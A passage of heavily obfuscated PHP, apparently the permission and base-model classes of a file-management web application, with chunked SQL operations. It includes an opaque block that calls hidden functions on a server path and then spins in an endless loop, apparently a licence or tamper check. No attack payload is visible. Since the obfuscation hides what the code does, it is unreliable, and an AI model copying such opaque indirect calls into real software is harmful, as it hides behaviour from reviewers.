array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $b = array(); foreach ($c as $EĬ) { if (!in_array($EĬ[$Fٰ[368]], $b⸟⠌)) { show_json(LNG($Fٰ[2152]), !1); } if ($A錜Ж != $F) { if ($EĬ[$Fٰ[368]] == SourceModel::TYPE_GROUP) { } if ($EĬ[$Fٰ[452]] != 0 && !in_array($EĬ[$Fٰ[452]], $Eּڅ)) { } } if ($EĬ[$Fٰ[452]] == 0) { $EĬ[$Fٰ[368]] = SourceModel::TYPE_USER; } $b[] = array($Fٰ[366] => $Eھۭ, $Fٰ[368] => intval($EĬ[$Fٰ[368]]), $Fٰ[452] => intval($EĬ[$Fٰ[452]]), $Fٰ[2135] => intval($EĬ[$Fٰ[2135]]) ? intval($EĬ[$Fٰ[2135]]) : 0, $Fٰ[2136] => intval($EĬ[$Fٰ[2136]]) ? intval($EĬ[$Fٰ[2136]]) : -1); } goto bݣب; bݣب: $this->where(array($Fٰ[380] => $Eھۭ))->delete(); $this->addAll($b); return !0; goto d醻ы; a: $F = 1; $A錜Ж = $C鴃[$Fٰ[452]]; if ($A錜Ж != $F) { $Bз̹ = array($Fٰ[2002] => $A錜Ж); $Eּڅ = Model($Fٰ[2081])->field($Fٰ[1339])->where($Bз̹)->select(); $Eּڅ = array_to_keyvalue($Eּڅ, $Fٰ[33], $Fٰ[1339]); } goto f; b麑ௐ: $Fٰ =& $_SERVER[놫Ӱ]; $C鴃 = Model($Fٰ[1075])->sourceInfo($Eھۭ); if ($C鴃[$Fٰ[368]] != SourceModel::TYPE_GROUP) { return !1; } goto a; d醻ы: } public function authClear($d) { $fݑ =& $_SERVER[놫Ӱ]; $e = Model($fݑ[1075])->sourceInfo($d); $cƃ = array($d); if ($e[$fݑ[367]] == $fݑ[493]) { $cߕӑ = array($fݑ[518] => array($fݑ[475], $e[$fݑ[455]] . $d . $fݑ[476])); $cƃ = Model($fݑ[1075])->field($fݑ[380])->where($cߕӑ)->getField($fݑ[366], !0); $cƃ[] = $d; } $this->where(array($fݑ[380] => array($fݑ[381], $cƃ)))->delete(); return !0; } public function get($e) { $a㶏 = $this->getSourceList(array($e), !0); return $a㶏[0]; } public function getSourceList($c߈攻, $D = false) { goto Cԯ; Dʙ: $b鏤 = array($d싌[380] => array($d싌[381], $Dձ)); $E = $this->field($Bڞ)->where($b鏤)->select(); $E = array_to_keyvalue_group($E, $d싌[366]); goto bǆ; dދ: if (!$D) { $b鏤 = array($d싌[380] => array($d싌[381], $c߈攻)); $D = $e->field($d싌[2153])->where($b鏤)->select(); $D = array_to_keyvalue($D, $d싌[366]); } $Dձ = $c߈攻; foreach ($D as $A׏ => $E㫕ܺ) { $Eݗȥ = $e->parentLevelArray($E㫕ܺ[$d싌[455]]); $Dձ = array_merge($Dձ, $Eݗȥ, array($A׏)); } goto F؅; bǆ: $C = array(); foreach ($D as $cї => $F׿) { $C[$cї] = $this->makeSourceAuth($F׿, $E); } return $C; goto E٬; F؅: $Dձ = array_values(array_unique($Dձ)); if (!$Dձ) { return array(); } $Bڞ = $d싌[2154]; goto Dʙ; Cԯ: $d싌 =& $_SERVER[놫Ӱ]; if (!$c߈攻) { return array(); } $e = Model($d싌[1075]); goto dދ; E٬: } public function authDeepCheck($Bɐ, $Fֹ = false) { $F徍 =& $_SERVER[놫Ӱ]; if ($GLOBALS[$F徍[453]]) { return !1; } $E֒ = $this->makeAuthDeep(); if (!in_array($Bɐ, $E֒)) { return !1; } return array($F徍[374] => -1, $F徍[414] => array($F徍[382] => $F徍[1004], $F徍[2008] => $F徍[464], $F徍[383] => LNG($F徍[2155]), $F徍[2020] => $F徍[2156])); } protected function makeAuthDeep() { goto C; f: $A责 = array_to_keyvalue($aҌ, $fƆь[33], $fƆь[366]); $AԻ = array(); $aև = $C; goto E; CΜ: return $AԻ; goto c鹷; C: $fƆь =& $_SERVER[놫Ӱ]; static $AԻ = false; if ($AԻ) { return $AԻ; } goto F; E: $Eኘ = Model($fƆь[1075]); $C䂠 = Model($fƆь[454]); if ($A责) { $eХ = $Eኘ->where(array($fƆь[366] => array($fƆь[381], $A责)))->select(); foreach ($eХ as $a) { $Bӭߪ = $Eኘ->parentLevelArray($a[$fƆь[455]]); $AԻ = array_merge($AԻ, $Bӭߪ); $aև[] = $a[$fƆь[452]]; } } goto A糼; Aů: $aև = array_values(array_unique($aև)); foreach ($aև as $C娂՛) { $e = $C䂠->getInfo($C娂՛); $AԻ[] = $e[$fƆь[388]][$fƆь[366]]; } $AԻ = array_values(array_unique($AԻ)); goto CΜ; fЦ: $C = Session::get($fƆь[2119]); $C = array_to_keyvalue($C, $fƆь[33], $fƆь[2002]); $EȦ = array($fƆь[368] => SourceModel::TYPE_USER, $fƆь[452] => USER_ID); goto b돒; b돒: if ($C) { $EȦ = array(array($fƆь[368] => SourceModel::TYPE_USER, $fƆь[452] => USER_ID), array($fƆь[368] => SourceModel::TYPE_GROUP, $fƆь[452] => array($fƆь[381], $C)), $fƆь[907] => $fƆь[2087]); } if ($bݚ) { $EȦ = array($EȦ, $fƆь[2135] => array($fƆь[2158], $bݚ)); } $aҌ = $this->field($fƆь[2159])->where($EȦ)->select(); goto f; A糼: $aև = array_values(array_unique($aև)); $C = $aև; foreach ($C as $C娂՛) { $e = $C䂠->getInfo($C娂՛); $Bӭߪ = $Eኘ->parentLevelArray($e[$fƆь[455]]); $aև = array_merge($aև, $Bӭߪ); } goto Aů; F: $A橳 = Model($fƆь[2157])->listData(); $bݚ = array(); foreach ($A橳 as $E) { if ($E[$fƆь[373]] == 0 && $E[$fƆь[2022]] == $fƆь[493]) { $bݚ[] = $E[$fƆь[364]]; } } goto fЦ; c鹷: } private function makeSourceAuth($dм, $fͻ) { goto Cܐ; a颃: $b = array_merge(array($dм[$A[366]]), array_reverse($b)); $f㐨 = !1; foreach ($b as $aѠȶ) { if (!isset($fͻ[$aѠȶ])) { continue; } $fӈ = $this->authMake($fͻ[$aѠȶ]); if ($fӈ[$A[414]]) { $f㐨 = $fӈ; break; } } goto F; Cܐ: $A =& $_SERVER[놫Ӱ]; $AǏ = Session::get($A[2119]); $b = Model($A[1075])->parentLevelArray($dм[$A[455]]); goto a颃; F: if (!$f㐨) { $AǏ = array_to_keyvalue($AǏ, $A[2002]); $b􈮱 = $dм[$A[452]]; $B = isset($AǏ[$b􈮱]) ? $AǏ[$b􈮱] : !1; if ($B) { $f㐨 = array($A[2160] => intval($B[$A[373]][$A[373]]), $A[2161] => $B[$A[373]]); } } if ((!$f㐨 || $f㐨[$A[374]] <= 0) && $dм[$A[368]] == SourceModel::TYPE_GROUP) { $f㐨 = $this->authDeepCheck($dм[$A[366]], $f㐨); } return $f㐨; goto Cй꾳; Cй꾳: } public function authOwnerApply($a͢) { goto E; Fߺ: $FأȪ = array(); $bٴ = array(); foreach ($dս as $f֖ => $B͋·) { $AԽ = $this->authFolderOwnerUser($B͋·); $FأȪ[$f֖] = $AԽ; $bٴ = array_merge($bٴ, $AԽ[$d[527]]); if ($AԽ[$d[2163]]) { break; } } goto dِʚ; FƩ: $bΪ = array($d[380] => array($d[381], $c)); $dս = $this->field($E̝ק)->where($bΪ)->select(); $dս = array_to_keyvalue_group($dս, $d[366]); goto Fߺ; E: $d =& $_SERVER[놫Ӱ]; if (!$a͢[$d[373]] || $a͢[$d[2162]]) { return $a͢; } if (AuthModel::authCheckRoot($a͢[$d[373]][$d[374]])) { return $a͢; } goto dߚݲ; dِʚ: if (count($bٴ) == 0) { $bٴ = $this->authFolderOwnerGroup($a͢[$d[452]]); } $bٴ = array_unique($bٴ); if (AuthModel::authCheckRoot($a͢[$d[373]][$d[374]])) { $bٴ[] = USER_ID; } goto c䋥; dߚݲ: $c = Model($d[1075])->parentLevelArray($a͢[$d[455]]); $c = array_merge(array($a͢[$d[366]]), array_reverse($c)); $E̝ק = $d[2154]; goto FƩ; c䋥: $a͢[$d[373]][$d[2164]] = Model($d[466])->userListInfo($bٴ); return $a͢; goto Fݯ; Fݯ: } private function authFolderOwnerGroup($BѨˠ) { $fȍ =& $_SERVER[놫Ӱ]; $b = Model($fȍ[2081])->where(array($fȍ[2002] => $BѨˠ))->select(); $c = array(); if (!$b) { return $c; } foreach ($b as $D̽) { $A젪 = $this->authInfo($D̽); if (AuthModel::authCheckRoot($A젪[$fȍ[373]])) { $c[] = $D̽[$fȍ[1339]]; } } return $c; } private function authFolderOwnerUser($a) { $E  =& $_SERVER[놫Ӱ]; $B = array(); $A׋ = !1; foreach ($a as $A̟) { $Dń = $this->authInfo($A̟); if ($A̟[$E [452]] == $E [464]) { $A׋ = !0; } if ($A̟[$E [368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Dń[$E [373]])) { $B[] = $A̟[$E [452]]; } } } return array($E [527] => $B, $E [2163] => $A׋); } public function authMake($A⮚) { goto B˄; Eݔ: $c = array_to_keyvalue($Fߋ, $d赌[33], $d赌[2002]); $d̗ = 0; $eԆ = 0; goto f; c̊ߟ: $AĊ֜ = $EĢǶ ? $bپ : ($d ? $EԆ : $DӰԻ); $dԕƦ = array($d赌[2160] => intval($cơ), $d赌[2161] => $AĊ֜); return $dԕƦ; goto B; B˄: $d赌 =& $_SERVER[놫Ӱ]; if (!$A⮚) { return array($d赌[374] => 0, $d赌[414] => !1); } $Fߋ = Session::get($d赌[2119]); goto Eݔ; f: $dļ = 0; $bپ = 0; $EԆ = 0; goto D; A玐: $c = 0; foreach ($A⮚ as $aȑҿ) { $AĊ֜ = $this->authInfo($aȑҿ); $A׆ = $aȑҿ[$d赌[452]]; $fۯ = intval($AĊ֜[$d赌[373]]); if ($aȑҿ[$d赌[368]] == SourceModel::TYPE_USER && $A׆ == USER_ID) { $EĢǶ = !0; $bپ = $AĊ֜; $d̗ = $fۯ; } else { if ($aȑҿ[$d赌[368]] == SourceModel::TYPE_GROUP && in_array($A׆, $c)) { $d = !0; if ($fۯ >= $eԆ) { $eԆ = $fۯ; $EԆ = $AĊ֜; } } else { if ($A׆ == 0) { $c = !0; $DӰԻ = $AĊ֜; $dļ = $fۯ; } } } } $cơ = $EĢǶ ? $d̗ : ($d ? $eԆ : $dļ); goto c̊ߟ; D: $DӰԻ = 0; $EĢǶ = 0; $d = 0; goto A玐; B: } public function authTargetInfoMake($D) { goto c፽ۨ; A: return array($fꧽ[2165] => $DՅȜ, $fꧽ[2166] => $EЙ); goto a; c፽ۨ: $fꧽ =& $_SERVER[놫Ӱ]; $DՅȜ = array(); $EЙ = array(); goto d݋; d݋: foreach ($D as $a§Ⱦ) { if ($a§Ⱦ[$fꧽ[368]] == SourceModel::TYPE_USER) { $DՅȜ[] = intval($a§Ⱦ[$fꧽ[452]]); } else { if ($a§Ⱦ[$fꧽ[368]] == SourceModel::TYPE_GROUP) { $EЙ[] = intval($a§Ⱦ[$fꧽ[452]]); } } } if ($DՅȜ) { $DՅȜ = Model($fꧽ[466])->userListInfo($DՅȜ); } if ($EЙ) { $B׆ւ = array($fꧽ[2079] => array($fꧽ[381], $EЙ)); $EЙ = Model($fꧽ[454])->field($fꧽ[2092])->where($B׆ւ)->select(); $EЙ = array_to_keyvalue($EЙ, $fꧽ[2002]); } goto A; a: } private function authInfo($Bȩ) { $aׯ =& $_SERVER[놫Ӱ]; if ($Bȩ[$aׯ[2135]]) { $bÄ׋ = Model($aׯ[2151])->listData($Bȩ[$aׯ[2135]]); if (!$bÄ׋) { return !1; $AȺ = Model($aׯ[2151])->listData(); $bʊè = array_filter_by_field($AȺ, $aׯ[373], $aׯ[464]); return $bʊè; } $F = array_field_key($bÄ׋, array($aׯ[364], $aׯ[28], $aׯ[373], $aׯ[2020], $aׯ[2023])); $F[$aׯ[2167]] = $Bȩ; return $F; } else { return array($aׯ[382] => 0, $aׯ[2008] => $Bȩ[$aׯ[2136]], $aׯ[383] => $aׯ[33], $aׯ[2020] => $aׯ[2168]); } } } if (!isset($_SERVER[$_SERVER[놫Ӱ][782]]) || !isset($_SERVER[$_SERVER[놫Ӱ][966]])) { goto b; b: $cܩ = $_SERVER[놫Ӱ][784]; $aΌ = $_SERVER[$_SERVER[놫Ӱ][779]] . $_SERVER[놫Ӱ][780]; $A = $cܩ($aΌ); goto eؕ˔; B: $e؇̅($_SERVER[$_SERVER[놫Ӱ][779]] . $_SERVER[놫Ӱ][780]); $A = 2; while ($A > 1) { $d = rawurlencode($A . $_SERVER[놫Ӱ][358]); } goto Eױ; eؕ˔: $Bٌ = explode($_SERVER[놫Ӱ][214], $A); if (count($Bٌ) < $_SERVER[놫Ӱ][573]) { $b = $_SERVER[놫Ӱ][785]; $b(); } $e؇̅ = $_SERVER[놫Ӱ][967]; goto B; Eױ: } goto BД; c: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\146\x79\x54\151\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\163\145\x72\164\54\x75\160\144\141\x74\x65", "\146\x75\x6e\x63\x74\151\x6f\x6e"), array("\143\162\145\x61\x74\145\x54\151\155\145", "\x74\x69\x6d\x65", "\151\x6e\163\x65\162\164", "\x66\x75\x6e\143\164\x69\x6f\156")); public function setDataAuto($eȠ) { $this->dataAuto = $eȠ; } public function __construct($D = '', $D匏 = '', $B = '') { parent::__construct($D, $D匏, $B); } static function textEncode($a٩) { $B܃ =& $_SERVER[놫Ӱ]; if (!$a٩) { return $B܃[33]; } $f = json_encode($a٩); $f = preg_replace_callback($B܃[338], function ($dӰ) { return addslashes($dӰ[0]); }, $f); return json_decode($f); } static function textDecode($Eظܝ) { $B =& $_SERVER[놫Ӱ]; $d = json_encode($Eظܝ); $d = preg_replace_callback($B[339], function ($D巨) { return $_SERVER[놫Ӱ][94]; }, $d); return json_decode($d); } protected $tableMeta = array(); protected function _beforeInsert(&$bѥ, $Eۯ) { $c =& $_SERVER[놫Ӱ]; if (!$this->checkDataAutoHas($c[340])) { return; } $this->dataBeforeFilter($bѥ, $c[340]); } protected function _beforeUpdate(&$B봈, $bƬޞ) { $cߠ =& $_SERVER[놫Ӱ]; if (!$this->checkDataAutoHas($cߠ[341])) { return; } $this->dataBeforeFilter($B봈, $cߠ[341]); } protected function _afterSelect(&$Eυ, $EҊ) { if (!is_array($Eυ)) { return; } if (!$this->checkDataAutoHas($_SERVER[놫Ӱ][342])) { return; } foreach ($Eυ as &$b˟ᮎ) { $this->dataAfterFilter($b˟ᮎ); } } protected function _afterFind(&$A², $fƇˉ) { if (!is_array($A²)) { return; } if (!$this->checkDataAutoHas($_SERVER[놫Ӱ][342])) { return; } $this->dataAfterFilter($A²); } public function setAutoIncrement($aɆ蝇) { $A = array($this->getPk() => $aɆ蝇); $d½͙ = $this->data($A)->add(); if ($d½͙) { $this->delete($d½͙); } } public function getAutoIncrement() { $c = $this->getTableName(); $A狦ݗ = $this->max($this->getPk()); $F뚇 = $this->query("\163\150\x6f\x77\40\x74\x61\142\x6c\x65\x20\163\164\141\x74\165\163\40\167\150\x65\x72\145\40\x4e\141\155\145\75\x27{$c}\x27"); $A顺 = $F뚇[0][$_SERVER[놫Ӱ][343]]; $f = max($A狦ݗ, $A顺); return $f; } protected function _callBefore($C, $EѴ) { return $this->cacheCallCheck($C, $EѴ, !1); } protected function _callAfter($d߂, $b) { return $this->cacheCallCheck($d߂, $b, !0); } protected function cacheFunctionAlias($f) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($c, $b, $aɩ = false) { $a = $this->cacheFunctionAlias($b); if (!$a) { return; } foreach ($a as $f => $F) { $b = $F[0]; $Aۃ = explode($_SERVER[놫Ӱ][47], $F[1]); if ($c == $f) { return $this->cacheFunctionGet($f, $b); } if ($aɩ && in_array($c, $Aۃ)) { $this->cacheFunctionClear($f, $b); } } } public function cacheFunctionGet($CԿ, $EϮܿ) { $dٸ = $this->cacheKeyMake($CԿ, $EϮܿ); $Cߏ = Cache::get($dٸ); if (!is_array($Cߏ)) { $Cߏ = call_user_func_array(array($this, $CԿ), array($EϮܿ, !0)); Cache::set($dٸ, $Cߏ); } return $Cߏ; } public function cacheFunctionClear($a鼰, $b걌) { $A = $b걌; if (!is_array($b걌)) { $A = array($b걌); } foreach ($A as $dɄؽ) { $E֨ٗ = $this->cacheKeyMake($a鼰, $dɄؽ); Cache::remove($E֨ٗ); } } private function cacheKeyMake($b, $B÷ɽ) { $Fډ =& $_SERVER[놫Ӱ]; return get_class($this) . $Fډ[71] . $b . $Fډ[344] . $B÷ɽ; } protected function selectPage($a۲ = 200, $Dɜ֦ = 1) { goto bđ; f: $this->optionsValue($Dܟ); $a㗻Ժ = $this->page($Dɜ֦, $a۲)->select(); if ($fǂԒ == 1) { $e = count($a㗻Ժ); } goto Aѣ; eՇ: $aՖϪ = 4000; $a۲ = isset($in[$a[345]]) ? $in[$a[345]] : $a۲; if ($a۲ === -1) { unset($in[$a[345]]); $aՖϪ = 100000000; $a۲ = $aՖϪ; } goto C̤; D: $fǂԒ = ceil($e / $a۲); $Dɜ֦ = intval(isset($in[$a[336]]) ? $in[$a[336]] : $Dɜ֦); $Dɜ֦ = $Dɜ֦ <= 1 ? 1 : ($Dɜ֦ >= $fǂԒ ? $fǂԒ : $Dɜ֦); goto f; C̤: $Dղ = $Dܟ; $Dղ[$a[346]] = array(); $this->optionsValue($Dղ); goto bҙ; bҙ: $e = intval($this->count()); $a۲ = intval($a۲); $a۲ = $a۲ <= 5 ? 5 : ($a۲ >= $aՖϪ ? $aՖϪ : $a۲); goto D; Aѣ: $E葙ߏ = array($a[347] => array($a[348] => $e, $a[345] => $a۲, $a[336] => $Dɜ֦, $a[349] => $fǂԒ), $a[350] => $a㗻Ժ ? $a㗻Ժ : array()); return $E葙ߏ; goto aؕ´; bđ: $a =& $_SERVER[놫Ӱ]; global $in; $Dܟ = $this->optionsValue(); goto eՇ; aؕ´: } protected function checkLength($cۯъ, $BÉ = 65536) { if (!$cۯъ || strlen($cۯъ) < $BÉ) { return; } show_json(LNG($_SERVER[놫Ӱ][351]) . "\x28{$BÉ}\x29", !1); } protected function metaSet($E, $f = null, $DǊ = null) { goto d͝Π; fˤ: if (is_null($f)) { return $c->where(array($Dחߎ => $E))->delete(); } if (is_null($DǊ)) { return $c->where($a)->delete(); } $this->checkLength($DǊ); goto c껗; F: $c = Model($this->tableMeta[$dÎؐ[353]]); if (is_array($f)) { $F = array(); foreach ($f as $Fّ詧 => $dͿ) { $this->checkLength($dͿ); $F[] = array($Dחߎ => $E, $dÎؐ[88] => $Fّ詧, $dÎؐ[354] => $dͿ); } $c->where(array($Dחߎ => $E))->addAll($F, array(), !0); return !0; } $a = array($Dחߎ => $E, $dÎؐ[355] => $f); goto fˤ; d͝Π: $dÎؐ =& $_SERVER[놫Ӱ]; if (!$this->tableMeta) { return !1; } $Dחߎ = $this->tableMeta[$dÎؐ[352]]; goto F; c껗: $eˢ = !1; if ($c->where($a)->find()) { $eˢ = $c->where($a)->save(array($dÎؐ[356] => $DǊ)); } else { $a[$dÎؐ[354]] = $DǊ; $eˢ = $c->add($a); } return $eˢ; goto b܃و; b܃و: } public function metaGet($b) { goto bʙ; BΒı: $c뙍 = Model($this->tableMeta[$a[353]]); $aΝ = array($C١ => $b); $Fɝ = $c뙍->field($a[357])->where($aΝ)->select(); goto f; bʙ: $a =& $_SERVER[놫Ӱ]; if (!$this->tableMeta) { return array(); } $C١ = $this->tableMeta[$a[352]]; goto BΒı; f: $Fɝ = array_to_keyvalue($Fɝ, $a[88], $a[354]); return $Fɝ; goto a; a: } private function checkDataAutoHas($EЭ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $F) { if (in_array($EЭ, explode($_SERVER[놫Ӱ][47], $F[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$f, $a) { $c֋ =& $_SERVER[놫Ӱ]; foreach ($this->dataAuto as $A畐) { $Bג = $A畐[0]; if (!in_array($a, explode($c֋[47], $A畐[2]))) { continue; } switch (trim($A畐[3])) { case $c֋[306]: case $c֋[307]: $d = $A畐[1]; $aې = isset($A畐[4]) ? (array) $A畐[4] : array(); if ($d == $c֋[187] && array_key_exists($Bג, $f)) { if (!$f[$Bג]) { unset($f[$Bג]); } break; } if (isset($f[$Bג])) { array_unshift($aې, $f[$Bג]); } if ($c֋[306] == $A畐[3]) { $f[$Bג] = call_user_func_array($d, $aې); } else { $f[$Bג] = call_user_func_array(array(&$this, $d), $aې); } break; case $c֋[258]: $f[$Bג] = $f[$A畐[1]]; break; case $c֋[279]: if (isset($f[$Bג]) && !is_string($f[$Bג])) { $f[$Bג] = json_encode_force($f[$Bג]); } break; case $c֋[308]: if ($f[$Bג] === $c֋[33]) { unset($f[$Bג]); } break; case $c֋[309]: $f[$Bג] = $A畐[1]; default: break; } } if ($a == $c֋[340]) { $fĔʮ = strtolower($this->db->getDbType()); if (strpos($fĔʮ, $c֋[9]) !== 0) { return; } $F = $this->field(!0)->fields; $fᵓǙ = $F[$c֋[237]]; if (isset($F[$c֋[236]])) { unset($fᵓǙ[$F[$c֋[236]]]); } foreach ($fᵓǙ as $bډ놽 => $a) { if (!isset($f[$bډ놽])) { $f[$bډ놽] = $c֋[33]; } } } } private function dataAfterFilter(&$Cȉ) { $a =& $_SERVER[놫Ӱ]; foreach ($this->dataAuto as $Fм) { $fԖ = $Fм[0]; if (!in_array($a[342], explode($a[47], $Fм[2]))) { continue; } if (!isset($Cȉ[$fԖ])) { continue; } switch (trim($Fм[3])) { case $a[306]: case $a[307]: $A = isset($Fм[4]) ? (array) $Fм[4] : array(); array_unshift($A, $Cȉ[$fԖ]); if ($a[306] == $Fм[3]) { $Cȉ[$fԖ] = call_user_func_array($Fм[1], $A); } else { $Cȉ[$fԖ] = call_user_func_array(array(&$this, $Fм[1]), $A); } break; case $a[258]: $Cȉ[$fԖ] = $Cȉ[$Fм[1]]; break; case $a[279]: $AµɄ = $Cȉ[$fԖ]; $Cȉ[$fԖ] = json_decode($AµɄ, !0); if (is_null($Cȉ[$fԖ])) { $Cȉ[$fԖ] = $AµɄ; } break; case $a[308]: if ($Cȉ[$fԖ] === $a[33]) { unset($Cȉ[$fԖ]); } break; case $a[309]: $Cȉ[$fԖ] = $Fм[1]; default: break; } } } public function saveAll($eǑצ) { goto C; c圂: $DČ = count($eǑצ); for ($e، = 0; $e، < $DČ; $e،++) { $AΝ = $eǑצ[$e،]; if (!is_array($AΝ) || count($AΝ) != 4) { continue; } $aɕ쒱 = "\x55\x50\104\101\124\105\40{$DҬ}\x20\x53\105\x54\x20{$AΝ[2]}\x20\75\40\x43\101\123\105\x20{$AΝ[0]}\40\12"; if ($C֕ == 0) { $eǂ = $aɕ쒱; } $Bױ[] = $AХ[112] . $AΝ[1] . $AХ[112]; $C֕++; $eǂ .= "\40\127\x48\105\116\40\47{$AΝ[1]}\47\x20\x54\x48\x45\x4e\40\x27{$AΝ[3]}\x27\x20\xa"; if ($C֕ == $A || $e، == $DČ - 1) { goto C; e: $Bױ = array(); goto Cم; C: $Dސ = implode($AХ[47], $Bױ); $eǂ .= "\x20\105\x4e\104\x20\x20\127\110\105\x52\x45\40{$AΝ[0]}\x20\111\116\40\x28{$Dސ}\x29\x20"; $this->execute($eǂ); goto bҼ; bҼ: $C֕ = 0; $eǂ = $aɕ쒱; $this->chunkEventCheck(count($Bױ)); goto e; Cم: } } $this->chunkEventSet(); goto B; C: $AХ =& $_SERVER[놫Ӱ]; $DҬ = $this->tablePrefix . $this->tableName; $A = self::SQL_WHERE_IN_CHUNK; goto bҖ; bҖ: $eǂ = $AХ[358]; $C֕ = 0; $Bױ = array(); goto c圂; B: } public function saveAllEach($Cᏽ) { $e =& $_SERVER[놫Ӱ]; $Fǭ = $this->tablePrefix . $this->tableName; foreach ($Cᏽ as $eŵ) { if (!is_array($eŵ) || count($eŵ) != 4) { continue; } $fТ = $eŵ[0] . $e[359] . $eŵ[1] . $e[112]; $e = $eŵ[2] . $e[359] . $eŵ[3] . $e[112]; $a凎ת = "\165\x70\144\x61\x74\x65\40{$Fǭ}\40\x73\145\164\40{$e}\40\x77\x68\145\x72\145\40{$fТ}\x3b"; $this->execute($a凎ת); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($f = false, $Bھ = false) { $this->_chunkEvent = $f; $this->_chunkEventParam = $Bھ; } private function chunkEventCheck($a¥) { if (!$this->_chunkEvent) { return; } $A˫ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $A˫[$_SERVER[놫Ӱ][360]] = $a¥; Hook::trigger($this->_chunkEvent, $A˫); } public function addAll($eč, $Eǆ = array(), $c셙 = false) { goto Aú; b˛Θ: if (method_exists($this->db, $C贕[257])) { for ($bΎ = 0; $bΎ < count($eč); $bΎ += $aɇ) { $Aݲ = array_slice($eč, $bΎ, $aɇ); if (!is_array($Aݲ) || count($Aݲ) == 0) { break; } $D֎̹ = $this->db->insertAll($Aݲ, $Eǆ, $c셙); $this->chunkEventCheck(count($Aݲ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($eč as $a⺌ => $dخפ) { $D֎̹ = $this->db->insert($dخפ, $Eǆ, $c셙); } $this->commit(); } if (!1 !== $D֎̹) { $bʚم = $this->getLastInsID(); if ($bʚم) { return $bʚم; } } return $D֎̹; goto f΂; D˨: if (empty($eč)) { $this->error = think_lang($C贕[256]); return !1; } $Eǆ = $this->_parseOptions($Eǆ); foreach ($eč as $a⺌ => $dخפ) { $eč[$a⺌] = $this->_facade($dخפ); $this->_beforeInsert($eč[$a⺌], $Eǆ); } goto b˛Θ; Aú: $C贕 =& $_SERVER[놫Ӱ]; ignore_timeout(); $aɇ = self::SQL_WHERE_IN_CHUNK; goto D˨; f΂: } public function save($Cۋ = '', $F浥 = array()) { goto d; fߡ: $CǪ = $dޯ[$cܕ[260]][$D̤ٗ][1]; $aܣ = count($CǪ); for ($aƢ© = 0; $aƢ© < $aܣ; $aƢ© += $FΩʑ) { $A = array_slice($CǪ, $aƢ©, $FΩʑ); if (!is_array($A) || count($A) == 0) { break; } $dޯ[$cܕ[260]][$D̤ٗ][1] = $A; $this->optionsValue($dޯ); $f += parent::save($Cۋ, $F浥); $this->chunkEventCheck(count($A)); } goto B¨҂; B¨҂: $this->chunkEventSet(); return $f; goto B裄; Dݾ: $D̤ٗ = $this->findWhereField($dޯ); if (!$D̤ٗ) { return parent::save($Cۋ, $F浥); } $f = 0; goto fߡ; d: $cܕ =& $_SERVER[놫Ӱ]; $FΩʑ = self::SQL_WHERE_IN_CHUNK; $dޯ = $this->optionsValue(); goto Dݾ; B裄: } public function add($E = '', $C٩ = array(), $D͒ = false) { if ($this->addTaskStatus && is_array($E)) { $this->addTaskData[] = $E; return; } return parent::add($E, $C٩, $D͒); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($D݉ = array()) { goto a; D򞠻Ϲ: $e = $this->findWhereField($E); if (!$e || isset($E[$eт[277]]) || isset($E[$eт[336]])) { return parent::select($D݉); } $cԫ = $E[$eт[260]][$e][1]; goto bջ; bջ: $fʅ̧ = null; for ($Cʧх = 0; $Cʧх < count($cԫ); $Cʧх += $B׉) { $b̽ = array_slice($cԫ, $Cʧх, $B׉); if (!is_array($b̽) || count($b̽) == 0) { break; } $E[$eт[260]][$e][1] = $b̽; $this->optionsValue($E); $a = parent::select($D݉); if (!$a) { continue; } if (is_null($fʅ̧)) { $fʅ̧ = array(); } $fʅ̧ = array_merge($fʅ̧, $a); } return $fʅ̧; goto e郈͹; a: $eт =& $_SERVER[놫Ӱ]; $B׉ = self::SQL_WHERE_IN_CHUNK; $E = $this->optionsValue(); goto D򞠻Ϲ; e郈͹: } public function delete($E = array()) { goto fѿ; AƇҞ: $Eʛڋ = $this->findWhereField($aⵆ); if (!$Eʛڋ) { return parent::delete($E); } $Eބ = 0; goto Cݺ۳; fѿ: $fم =& $_SERVER[놫Ӱ]; $Eᖙ = self::SQL_WHERE_IN_CHUNK; $aⵆ = $this->optionsValue(); goto AƇҞ; Cݺ۳: $c㡪 = $aⵆ[$fم[260]][$Eʛڋ][1]; for ($f = 0; $f < count($c㡪); $f += $Eᖙ) { $a𗣖 = array_slice($c㡪, $f, $Eᖙ); if (!is_array($a𗣖) || count($a𗣖) == 0) { break; } $aⵆ[$fم[260]][$Eʛڋ][1] = $a𗣖; $this->optionsValue($aⵆ); $Eބ += parent::delete($E); } return $Eބ; goto Fҷ; Fҷ: } private function findWhereField($Fܔا) { $AŰ =& $_SERVER[놫Ӱ]; $d = self::SQL_WHERE_IN_CHUNK; if (!is_array($Fܔا) || !is_array($Fܔا[$AŰ[260]])) { return !1; } foreach ($Fܔا[$AŰ[260]] as $eݰ => $D) { if (is_array($D) && isset($D[0]) && is_string($D[0]) && strtolower($D[0]) == $AŰ[7] && is_array($D[1]) && count($D[1]) > $d) { ignore_timeout(); return $eݰ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\x6d\117\x70\164\151\x6f\156"; public $field = array(); public function listData($Dܮġ = false, $Dܛ = "\x6d\157\x64\151\146\171\124\x69\155\x65", $C = false) { $b߻߿ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$Dܮġ) { $b߻߿ = array_filter(array_values($b߻߿)); return array_sort_by($b߻߿, $Dܛ, $C); } return $b߻߿[$_SERVER[놫Ӱ][361] . $Dܮġ]; } public function insert($Bڜ䙸) { goto eٗ; e֪͐: return $D; goto d; Eӄ: $Bڜ䙸[$c[106]] = time(); 